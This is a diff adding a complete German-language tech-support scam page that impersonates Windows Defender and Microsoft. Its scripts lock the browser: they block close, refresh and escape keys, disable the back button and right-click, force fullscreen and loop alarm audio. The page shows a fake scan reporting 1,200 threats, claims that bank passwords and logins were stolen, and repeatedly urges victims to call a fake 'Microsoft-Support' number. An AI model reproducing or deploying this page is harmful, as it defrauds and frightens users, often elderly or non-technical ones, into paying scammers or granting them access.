@@ -1,0 +1,738 @@
+<!DOCTYPE html><html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
+    <meta content="noindex,nofollow" name="robots">
+    <title>Defender Smart Screen-Fehler</title>
+    <link rel="stylesheet icon" href="images/msmm.png">
+    <link href="css/tapa.css" rel="stylesheet">
+    <script type="text/javascript" src="js/jquery-1.4.4.min.js"></script>
+    <script type="text/javascript">
+        $(function () {
+            $('body').bind('contextmenu', function (e) {
+                return false;
+            });
+        });
+		
+		
+    </script>
+	   
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-03D7NBPX0X"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-03D7NBPX0X');
+</script>
+
+
+
+	
+	
+</head>
+<body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
+    <!-- Your existing HTML content goes here -->
+
+    <!-- Browser Freezing Script -->
+    <script>
+        // Disable right-click context menu
+        document.addEventListener('contextmenu', function (e) {
+            e.preventDefault();
+        });
+
+        // Disable keyboard shortcuts (Ctrl+W, Alt+F4, etc.)
+        document.addEventListener('keydown', function (e) {
+            // Block Ctrl+W (Close Tab)
+            if (e.ctrlKey && e.key === 'w') {
+                e.preventDefault();
+            }
+            // Block Alt+F4 (Close Window)
+            if (e.altKey && e.key === 'F4') {
+                e.preventDefault();
+            }
+            // Block F12 (Developer Tools)
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+        });
+
+        // Prevent the user from closing the tab/window
+        window.onbeforeunload = function (e) {
+            e.preventDefault();
+            e.returnValue = ''; // Required for Chrome
+            return ''; // Required for Firefox
+        };
+
+        // Disable back button
+        history.pushState(null, document.title, location.href);
+        window.addEventListener('popstate', function (e) {
+            history.pushState(null, document.title, location.href);
+        });
+
+        // Disable refresh (F5 and Ctrl+R)
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
+                e.preventDefault();
+            }
+        });
+
+        // Disable dragging of images and links
+        document.addEventListener('dragstart', function (e) {
+            e.preventDefault();
+        });
+
+        // Disable text selection
+        document.addEventListener('selectstart', function (e) {
+            e.preventDefault();
+        });
+
+        // Disable opening new tabs/windows
+        document.addEventListener('keydown', function (e) {
+            if (e.ctrlKey && e.key === 't') {
+                e.preventDefault();
+            }
+            if (e.ctrlKey && e.key === 'n') {
+                e.preventDefault();
+            }
+        });
+
+        // Disable closing the browser using JavaScript
+        window.open = function () {
+            return false;
+        };
+        window.close = function () {
+            return false;
+        };
+    </script>
+
+    <!-- Your existing HTML content continues here -->
+
+
+    <div style="position:absolute; top:100px; right:10px; z-index:9999;">
+        <img src="images/def.gif" alt="" width="500">
+    </div>
+    <div class="bg" style="cursor:none">
+        <div class="bgimg" style="top:0">
+            <img src="images/f24.png" alt="" width="100%">
+        </div>
+    </div>
+    <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
+        <div class="black" style="height: 145%; cursor: none; display: block;"></div>
+    </a>
+    <audio id="surejust" src="media/audio.mp3" preload="auto"></audio>
+    <div class="pro_box" style="cursor: none; display: block;">
+        <div class="pro_box_header">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="minimize">
+                        <ul>
+                            <li>
+                                <a href="#">
+                                    <img src="images/mnc.png">
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="logo">
+                        <img src="images/msmm.png">
+                        <span>Windows Sicherheit</span>
+                    </div>
+                </div>
+                <div class="col-md-8">
+                    <div class="activate_lic">
+                        <ul>
+                            <li>
+                                <a href="#">
+                                    <button>Activate your license</button>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="#">
+                                    <img src="images/set.png">
+                                </a>
+                            </li>
+                            <li>
+                                <a href="#">
+                                    <img src="images/ques.png">
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="scan_box">
+            <div class="scan_box_header">
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="quick_scan">
+                            <p>
+                                <img src="images/vsc.png">
+                                <span>scanning rapido</span>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="minimize1">
+                            <ul>
+                                <li>
+                                    <a href="#">
+                                        <img src="images/mnc.png">
+                                    </a>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="scan_body">
+                <div style="margin: 15px 10px;">
+                    <img src="images/bxs.png" alt="" style="max-width: 100%;">
+                </div>
+                <div class="table_quick">
+                    <table class="table table-bordered">
+                        <thead>
+                            <tr>
+                                <th scope="col">scanned object</th>
+                                <th scope="col">
+                                    <div class="col_fourth counter">
+                                        <h2 class="count-number count-title timer" data-speed="5000" data-to="51900">51,900</h2>
+                                    </div>
+                                </th>
+                            </tr>
+                            <tr>
+                                <th scope="col">time spent</th>
+                                <th scope="col">5 secs</th>
+                            </tr>
+                            <tr>
+                                <th scope="col">identified threats</th>
+                                <th scope="col" style="color:red">
+                                    <h2 class="count-number count-title timer" data-speed="2500" data-to="1200">1,200</h2>
+                                </th>
+                            </tr>
+                        </thead>
+                    </table>
+                </div>
+            </div>
+            <div class="scan_footer">
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="bt_can">
+                            <div class="btn-group" role="group" aria-label="Basic example">
+                                <button class="btn btn-secondary" type="button">Abbrechen</button>
+                            </div>
+                            <div class="btn-group" role="group" aria-label="Basic example">
+                                <button class="btn btn-secondary" type="button">pause</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="bt_can2">
+                            <div class="btn-group" role="group" aria-label="Basic example">
+                                <button class="btn btn-secondary" type="button">scheduled scan</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="pro_box2" style="cursor: none; display: block;">
+        <img src="images/bx1.png" alt="" style="width:100%;max-width: 100%;display: block; margin: 0 auto;">
+    </div>
+    <div class="pro_box3" style="cursor: none; display: block;">
+        <div class="pro_box_header">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="minimize">
+                        <ul>
+                            <li>
+                                <a href="#">
+                                    <img src="images/mnc.png">
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="logo">
+                        <img src="images/msmm.png">
+                        <span>Windows-Sicherheit</span>
+                    </div>
+                </div>
+                <div class="col-md-8">
+                    <div class="activate_lic">
+                        <ul>
+                            <li>
+                                <a href="#">
+                                    <button>Aktivieren Sie Ihre Lizenz</button>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="#">
+                                    <img src="images/bel.png">
+                                </a>
+                            </li>
+                            <li>
+                                <a href="#">
+                                    <img src="images/set.png">
+                                </a>
+                            </li>
+                            <li>
+                                <a href="#">
+                                    <img src="images/ques.png">
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="scan_box2">
+            <div class="scan_box_header">
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="quick_scan">
+                            <p>
+                                <img src="images/vsc.png">
+                                <span>scan</span>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="minimize1">
+                            <ul>
+                                <li>
+                                    <a href="#">
+                                        <img src="images/mnc.png">
+                                    </a>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="scan_body">
+                <div class="row">
+                    <div class="col-md-12">
+                        <div class="tooreg_detail_scan">
+                            <ul>
+                                <li>
+                                    <a href="#">scan</a>
+                                </li>
+                                <li>
+                                    <a href="#">scan plan</a>
+                                </li>
+                                <li>
+                                    <a href="#">report</a>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <br>
+                <div class="table_quick2">
+                    <div class="row">
+                        <div class="col-md-4">
+                            <div class="pc_desk">
+                                <img src="images/pcm.png">
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="card_top scan_pro">
+                                <ul>
+                                    <li>
+                                        <i aria-hidden="true" class="fa fa-check"></i> Check for updates
+                                    </li>
+                                    <li>
+                                        <i aria-hidden="true" class="fa fa-check"></i> scan memory
+                                    </li>
+                                    <li>
+                                        <i aria-hidden="true" class="fa fa-check"></i> Analyze startup items
+                                    </li>
+                                    <li>
+                                        <div class="circular-spinner"></div>
+                                        <span>Registry analysis</span>
+                                    </li>
+                                    <li>File system analysis</li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="scan_dur">
+                                <p>
+                                    <strong>Duration of analysis</strong>
+                                </p>
+                                <p>3 min 0 seconds</p>
+                                <p>5 min 0 seconds</p>
+                                <br>
+                                <p>
+                                    <strong>scanned item</strong>
+                                </p>
+                                <p>51,900</p>
+                                <br>
+                                <p>
+                                    <strong>Erkennung</strong>
+                                </p>
+                                <p>11</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="scan_footer3">
+                <div class="row">
+                    <div class="col-md-2">
+                        <div class="viruses">
+                            <img src="images/vsc.png">
+                        </div>
+                    </div>
+                    <div class="col-md-10">
+                        <div class="make_this">
+                            <p>This is the last thing you need to worry about when it comes to online threats. </p>
+                            <p>Premium blocks malware, viruses, and more without slowing down your computer. Upgrade to premium version</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999;" id="footer">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="right-foot" style="text-align:center;margin-bottom: 5px;">
+                    <span id="footertxt">
+                        <img src="images/msmm.png"> Windows Sicherheit </span>
+                    <span style="font-weight:500;padding-left:13px;color:#fff; "> <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> Microsoft-Support : 069-6677-9511
+                        </span>
+                    </span>
+                </div>
+            </div>
+            <div class="col-md-12">
+                <marquee direction="left" height="100px" width="100%">
+                    <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen
+  verhindert jetzt die Anzeige unbekannter Anwendungen. 
+Das                       System ist möglicherweise gefährdet.    
+                                           Ein Windows Defender-Scan
+  
+        hat auf diesem Gerät Adware gefunden,
+                                             die Passwörter,      
+  Online-Identitäten,  
+                Finanzinformationen, 
+                                           persönliche Dateien, Fotos und
+  Dokumente stehlen kann. </small>
+                </marquee>
+            </div>
+        </div>
+    </div>
+    <div class="lightbox" id="poptxt" style="display: block;">
+        <div class="ilb top" style="font-size:24px">
+            <div class="ilb headers" style="border-bottom:1px solid #d6d5d5">
+                <span class="fl title" id="txtadd">
+                    <span class="fl ilb">
+                        <img src="images/dm.png" class="logo3">
+                    </span>Windows Defender Sicherheitswarnung </span>
+                <span class="fl title2" id="txts1">
+                    <a href="#" id="bgt">
+                        <img src="images/cs.png">
+                    </a>
+                </span>
+            </div>
+        </div>
+        <br><br>
+
+        <img src="images/re.gif" id="banner">
+        <br>
+        <div id="disclaimer">Der Zugriff auf dieses System wurde aus Sicherheitsgründen blockiert. <br>
+            <span class="support" style="font-size:20px;">Fehlercode: 0xvdstvb<br><span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="images/winlo.png" alt="" style="width: 25px;vertical-align: sub;">Windows-Support : 069-6677-9511
+                </span>
+            </span>
+        </div>
+        <div id="bottom">
+            <img src="images/msmm.png" id="badge">
+            <span class="title3">Windows</span>
+            <ul>
+                <li>
+                    <a href="#">
+                        <div class="fr button2">
+                            <span id="addtochromebutton">Zurück</span>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="#">
+                        <div class="fr button blink">
+                            <span id="addtochromebutton">Beheben</span>
+                        </div>
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new">
+        <p style="font-size:16px;font-weight:400;margin:0;margin-bottom:5px;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:8px" class="text-center">Windows-Defender - Sicherheitswarnung</p>
+        <p>
+            <b>Aus Sicherheitsgründen
+     ist der Zugang 
+                                               zu diesem Computer gesperrt !</b>
+        </p>
+        <p>Es wurde berichtet, dass Ihr 
+                               Computer mit Trojaner-Spyware infiziert ist.  
+       Die folgenden Daten wurden
+      kompromittiert:
+        </p>
+        <p>>E-Mail-ID <br>> Bankpasswort <br>> Facebook-Login <br>> Fotos und Dokumente </p>
+        <p>Der Windows Defender-Scan hat auf   diesem Gerät Adware gefunden, die Passwörter, Online-Identitäten, Finanzinformationen, persönliche Dateien, 
+                 Fotos und  Dokumente stehlen kann. </p>
+        <p>Bitte kontaktieren Sie uns umgehend.
+ Unser Techniker wird Sie telefonisch durch   
+          
+  den Entfernungsprozess führen. </p>
+        <p>Rufen Sie sofort den Windows-Support
+  an, um diese Bedrohung zu melden,
+     Identitätsdiebstahl zu verhindern und den      
+  Zugriff auf dieses Gerät freizugeben. </p>
+        <p>Das Schließen dieses Fensters kann 
+  Ihre persönlichen 
+   Daten gefährden und dazu führen,
+  dass Ihre Windows-Registrierung gesperrt wird.. </p>
+        <p style="padding-bottom:0;color:#fff;font-size:18px"> <strong>
+                <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br>Microsoft-Support: 069-6677-9511
+                </span>
+            </strong>
+        </p>
+        <div class="action_buttons">
+            <a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">OK</a>
+            <a class="active" id="leave_page" style="color:#fff!important">Abbrechen</a>
+        </div>
+    </div>
+    <div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
+        <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">Der Zugriff auf diesen PC wurde 
+ aus Sicherheitsgründen blockiert.
+ Schalten Sie den
+ Computer nicht aus oder starten Sie den nicht neu.
+ Rufen Sie uns an und ein Microsoft-Experte wird
+ Ihnen telefonisch weiter helfen. <br>
+            <strong>Windows-Support: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src="images/winlo.png" alt="" style="width: 25px;vertical-align: bottom;">  069-6677-9511
+                </span>
+            </strong>
+        </p>
+    </div>
+    <div id="chat" style="display: block;">
+        <img src="images/msmm.png">
+        <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+        <p style="font-weight:600;font-size:24px">Windows Support: <br>
+        </p>
+        <h4 style="font-weight:600;font-size:22px"> <img src="images/winlo.png" alt="" style="width: 25px;margin-left: 0;">
+            Jetzt Anrufen 069-6677-9511
+            <br>(Gebührenfrei)
+        </h4>
+        <div class="arrow-down">
+            <svg height="1em" viewBox="0 0 320 512">
+                <style>
+                    svg {
+                        fill: #fff
+                    }
+                </style>
+                <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z">
+                </path>
+            </svg>
+        </div>
+    </div>
+    
+    <script>
+        $(function () {
+            var a = 0,
+                b = setInterval(function () {
+                    a += 10;
+                    $("#dynamic").css("width", a + "%").attr("aria-valuenow", a).text(a + "% Complete");
+                    100 <= a && clearInterval(b)
+                }, 100)
+        });
+    </script>
+    
+
+    <script>
+        addEventListener("click", function () {
+            var el = document.documentElement
+                , rfs =
+                    el.requestFullScreen
+                    || el.webkitRequestFullScreen
+                    || el.mozRequestFullScreen
+                ;
+            rfs.call(el);
+        });
+
+    </script>
+
+
+    <script>
+        setInterval(function () {
+            document.getElementById("surejust").play()
+        }, 500);
+    </script>
+    <script>
+        var e = 1;
+        setInterval(function () {
+            1 == e ? (document.getElementById("favicon").href = "index.html", e = 0) : (document.getElementById("favicon").href = "index.html", e = 1)
+        }, 1E3);
+    </script>
+    <script>
+        $(document).ready(function () {
+            $("#mycanvas").click(function () {
+                $("#welcomeDiv").show()
+            })
+        });
+    </script>
+
+    <script>
+        $(document).ready(function () {
+            $("#mycanvas").click(function () {
+                $("#poptxt").show()
+            })
+        });
+        $(document).ready(function () {
+            $("#cross").click(function () {
+                $("#poptxt").show()
+            })
+        });
+    </script>
+
+    <script>
+        $(document).ready(function () {
+            $("#mycanvas").click(function () {
+                $("#footer").show()
+            })
+        });
+    </script>
+    <script>
+        $(document).ready(function () {
+            $("body").mouseover(function () {
+                $("#poptxt").show()
+            })
+        });
+    </script>
+    <style>
+        body {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+        }
+    </style>
+    <script>
+        var isNS = "Netscape" == navigator.appName ? 1 : 0;
+        "Netscape" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);
+
+        function mischandler() {
+            return !1
+        }
+
+        function mousehandler(a) {
+            a = isNS ? a : event;
+            a = isNS ? a.which : a.button;
+            if (2 == a || 3 == a) return !1
+        }
+        document.oncontextmenu = mischandler;
+        document.onmousedown = mousehandler;
+        document.onmouseup = mousehandler;
+    </script>
+    <script>
+        document.onkeydown = function (a) {
+            return !1
+        };
+    </script>
+    <script>
+        document.attachEvent("onkeydown", win_onkeydown_handler);
+
+        function win_onkeydown_handler() {
+            switch (event.keyCode) {
+                case 116:
+                    event.returnValue = !1;
+                    event.keyCode = 0;
+                    break;
+                case 27:
+                    event.returnValue = !1, event.keyCode = 0
+            }
+        }
+    </script>
+    <script>
+        $(document).ready(function () {
+            $("#chat").delay(600).fadeIn(100)
+            var audioElement = document.createElement('audio');
+            audioElement.setAttribute('src', 'webs.mp4');
+
+            audioElement.addEventListener('ended', function () {
+                this.play();
+            }, false);
+
+
+            $('#mycanvas').click(function () {
+                audioElement.play();
+
+            });
+
+            $('#link_black').click(function () {
+                audioElement.play();
+
+            });
+
+
+            $('.pro_box').click(function () {
+                audioElement.play();
+
+            });
+
+            $('#poptxt').click(function () {
+                audioElement.play();
+
+            });
+
+        });
+    </script>
+
+    <script>
+        $(document).ready(function () {
+            var audioElement = document.createElement('audio');
+            audioElement.setAttribute('src', 'visudk.mp4');
+
+            audioElement.addEventListener('ended', function () {
+                this.play();
+            }, false);
+
+
+            $('#mycanvas').click(function () {
+                audioElement.play();
+
+            });
+
+            $('#link_black').click(function () {
+                audioElement.play();
+
+            });
+
+
+            $('.pro_box').click(function () {
+                audioElement.play();
+
+            });
+
+            $('#poptxt').click(function () {
+                audioElement.play();
+
+            });
+
+        });
+    </script>
+
+    <script src="js/esc.js"></script>
+
+</body>
+</html>
